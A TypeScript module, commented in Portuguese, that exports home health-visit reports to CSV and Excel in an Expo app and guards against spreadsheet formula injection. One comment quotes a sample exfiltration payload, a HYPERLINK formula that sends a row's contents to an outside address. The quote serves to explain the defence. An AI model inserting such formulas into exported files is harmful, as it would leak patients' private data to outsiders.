/**
 * Serviço de exportação de relatórios (CSV e Excel).
 *
 * Escreve com a API de arquivos do Expo SDK 54 (`File` e `Paths`). A API
 * anterior foi removida: `documentDirectory` e `EncodingType` não existem
 * mais, e `writeAsStringAsync` permanece apenas como stub que lança erro em
 * tempo de execução. Quem abrisse a tela de relatórios e tocasse em exportar
 * recebia TypeError antes de qualquer byte ser gravado.
 */
import { File, Paths } from 'expo-file-system';
import * as Sharing from 'expo-sharing';
import { utils, write } from 'xlsx';
import { Visita } from '../types';
import { formatDate, formatDateTime } from '../utils/formatters';

export type PeriodoRelatorio = 'dia' | 'semana' | 'mes';
export type FormatoRelatorio = 'csv' | 'xlsx';

export interface DadosRelatorio {
  visitas: Visita[];
  periodo: PeriodoRelatorio;
  data_referencia: string;
}

export const exportService = {
  /**
   * Exporta visitas como CSV ou Excel e abre o compartilhamento nativo.
   */
  async exportarVisitas(
    dados: DadosRelatorio,
    formato: FormatoRelatorio = 'xlsx'
  ): Promise<void> {
    const linhas = dados.visitas.map((v) => ({
      'Data': formatDate(v.data_visita),
      // A visita guarda só o dia. Hora que existe de fato é a do registro no
      // aparelho; a coluna "Horário" antiga mostrava 21:00 inventado pelo fuso.
      'Registrado em': formatDateTime(v.created_at),
      'Endereço': v.residencia
        ? `${v.residencia.logradouro}, ${v.residencia.numero} - ${v.residencia.bairro}`
        : v.residencia_id,
      'Paciente': v.morador?.nome ?? '-',
      'Status': traduzirStatus(v.status),
      'Queixas': v.queixas ?? '-',
      'Observações': v.observacoes ?? '-',
      'Agendamento': v.precisa_agendamento ? 'Sim' : 'Não',
      'Especialidade': v.especialidade_agendamento ?? '-',
    }));

    const nome = `visitas_${dados.periodo}_${dados.data_referencia}`;
    if (formato === 'csv') {
      await exportarCSV(linhas, nome);
    } else {
      await exportarExcel(linhas, `Visitas - ${traduzirPeriodo(dados.periodo)}`, nome);
    }
  },
};

// ============================================================
// HELPERS INTERNOS
// ============================================================

/**
 * Grava o arquivo na pasta de documentos e devolve a URI.
 *
 * `write` é síncrono na API nova. Um arquivo que já existe é apagado antes,
 * porque `create` recusa sobrescrever e a pessoa pode exportar o mesmo
 * período duas vezes seguidas.
 */
function gravar(nomeArquivo: string, conteudo: string | Uint8Array): string {
  const arquivo = new File(Paths.document, nomeArquivo);
  if (arquivo.exists) arquivo.delete();
  arquivo.create();
  arquivo.write(conteudo);
  return arquivo.uri;
}

/**
 * Neutraliza injeção de fórmula em planilha.
 *
 * Excel e LibreOffice executam o conteúdo de uma célula que começa com `=`,
 * `+`, `-`, `@`, tab ou retorno de carro. Como as queixas e observações são
 * texto livre digitado pelo agente em campo, um valor como
 * `=HYPERLINK("http://...&"&A1)` vazaria a linha inteira para fora no momento
 * em que alguém da secretaria abrisse o relatório. Prefixar com apóstrofo faz
 * a planilha tratar como texto, e o apóstrofo não aparece na célula.
 */
function neutralizarFormula(valor: unknown): string {
  const texto = String(valor ?? '');
  return /^[=+\-@\t\r]/.test(texto) ? `'${texto}` : texto;
}

async function exportarCSV(
  dados: Record<string, unknown>[],
  nomeArquivo: string
): Promise<void> {
  if (dados.length === 0) throw new Error('Sem dados para exportar');

  const headers = Object.keys(dados[0]).join(';');
  const rows = dados.map((row) =>
    Object.values(row)
      .map((v) => `"${neutralizarFormula(v).replace(/"/g, '""')}"`)
      .join(';')
  );
  const csv = [headers, ...rows].join('\n');
  const bom = '﻿'; // BOM para Excel reconhecer UTF-8

  const uri = gravar(`${nomeArquivo}.csv`, bom + csv);
  await compartilharArquivo(uri, 'text/csv');
}

async function exportarExcel(
  dados: Record<string, unknown>[],
  nomeAba: string,
  nomeArquivo: string
): Promise<void> {
  if (dados.length === 0) throw new Error('Sem dados para exportar');

  const seguros = dados.map((row) =>
    Object.fromEntries(Object.entries(row).map(([k, v]) => [k, neutralizarFormula(v)]))
  );

  const ws = utils.json_to_sheet(seguros);
  const wb = utils.book_new();
  utils.book_append_sheet(wb, ws, nomeAba);

  // `type: 'array'` devolve ArrayBuffer, que é o que a API nova grava como
  // binário. O caminho antigo passava por base64 e dependia de EncodingType,
  // que não existe mais.
  const buffer = write(wb, { type: 'array', bookType: 'xlsx' }) as ArrayBuffer;

  const uri = gravar(`${nomeArquivo}.xlsx`, new Uint8Array(buffer));
  await compartilharArquivo(
    uri,
    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
  );
}

async function compartilharArquivo(uri: string, mimeType: string): Promise<void> {
  const available = await Sharing.isAvailableAsync();
  if (!available) throw new Error('Compartilhamento não disponível neste dispositivo');
  await Sharing.shareAsync(uri, { mimeType, UTI: mimeType });
}

function traduzirStatus(status: string): string {
  const map: Record<string, string> = {
    realizada: 'Realizada',
    agendada: 'Agendada',
    cancelada: 'Cancelada',
    nao_encontrado: 'Não encontrado',
  };
  return map[status] ?? status;
}

function traduzirPeriodo(periodo: PeriodoRelatorio): string {
  const map: Record<PeriodoRelatorio, string> = {
    dia: 'Diário',
    semana: 'Semanal',
    mes: 'Mensal',
  };
  return map[periodo];
}
